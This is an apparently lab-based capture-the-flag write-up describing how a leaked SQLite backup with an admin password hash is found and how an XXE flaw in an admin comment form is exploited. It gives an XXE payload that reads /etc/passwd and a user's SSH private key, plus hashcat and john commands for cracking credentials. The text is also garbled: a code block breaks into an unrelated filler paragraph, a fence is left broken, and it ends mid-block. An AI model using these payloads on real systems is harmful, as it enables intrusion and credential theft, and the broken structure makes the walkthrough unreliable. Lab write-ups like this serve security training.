---
## Entry Point

> There are two files in this directory: **mobile.js** and **users.bak**. But I'm specifically interested in the second one.

> The **.bak** extension does not refer to any one file type, but is a general convention for designating a backup copy of
> something. These can be: **.txt** , **.db** , **.php** , **.js** files, etc. Such files can potentially contain sensitive
> data.

> I download the file to my machine and check its type via **file**:


```bash

file users.bak

users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2

```

> The file type indicates that this is a **SQLite** DBMS.

> It supports SQL syntax that is similar to PostreSQL and MysQL, so I can work with this DBMS as with other regular databases.
> For example, view the contents of existing tables:

```bash

sqlite3 users.bak

SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.

sqlite> .tables
users

sqlite> select * from users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

sqlite>

```

> Also for convenience I can upload the database dump to a .sql file:

```bash

sqlite3 users.bak .dump > dump.sql

cat dump.sql

PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users(username text NOT NULL, password text NOT NULL);
INSERT INTO users VALUES('admin','1868e36a6d2b17d4c2745f1659433a54d4bc5f4b');
COMMIT;

```
> So i got the user data **admin** or more precisely the **hash** of his password: ```admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b```
> Most likely these are the credentials from the admin panel previously discovered on port **8765**.

> I save the hash to a file and run it through **hashcat** to identify the password:

```bash

echo '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b' > hast.txt

  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done
       something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life.
       Life is so precious because it is short and you are being so careless that you do not realize it until now since this void
       paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using
       your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph
       and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time,
       you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>

> There is nothing interesting in the message, but there is the **XML structure** of the message itself (and this is very important).

> The admin panel page has a form for adding a comment. I send a request to **BurpSuite** for checking:


```html

### XXE exploitation

> I see that the **POST** request is sent with a body in which the **xml** parameter sends an **XML fragment**.
> That is any comment sent in this form has the **xml** structure.

> There may be an **XXE vulnerability** if the server side parses this parameter as an XML document and allows external entities.
> This vulnerability occurs when the server parses the XML content as is without any verification.

> For an example of dangerous code in php:

```php

$xml = $_POST['xml'];
$doc = new DOMDocument();
$doc->loadXML($xml);

```
> or in python:

```python

xml = request.POST['xml']
doc = parseString(xml) 

```

> The point is that the server receives an XML payload from the user then parses it as is with all the strings and executes the commands in the transferred
> entities. Reads any file (or executes) on the server and returns its contents as XML back to the user.

> there is an example of **XXE payload** for vulnerability testing on **PortSwigger**:

![XXE_payload](./screenshots/XXE_payload.png)

[XXE payload](https://portswigger.net/web-security/xxe)

> I make the same message structure as in the **dontforget.bak** file. Also, I need to apply url encoding. For convenience, I use the extension
> in BurpSuite - **Hackvertor** and wrap my payload in ```<@urlencode></@urlencode>```:

```html

xml=<@urlencode><?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
</@urlencode>

```

> Result:

![passwd_file](./screenshots/passwd_file.png)

> it's work. i get **/etc/passwd** file from server. Ok.

> i change the entity file to **/home/barry/.ssh/id_rsa** since **Barry** has his own SSH key and repeating the request

> Result:

![ssh_key](./screenshots/ssh_key.png)

> I copy the key and try to connect to the system via SSH:

```bash

ssh -i private_key barry@10.10.124.65
Enter passphrase for key 'private_key':

```
> I need the passphrase...

> I extract the hash of the passphrase from the private key and pass it through **john**:

```bash

ssh2john private_key > private_key_hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt private_key_hash.txt

```

> Result

```bash
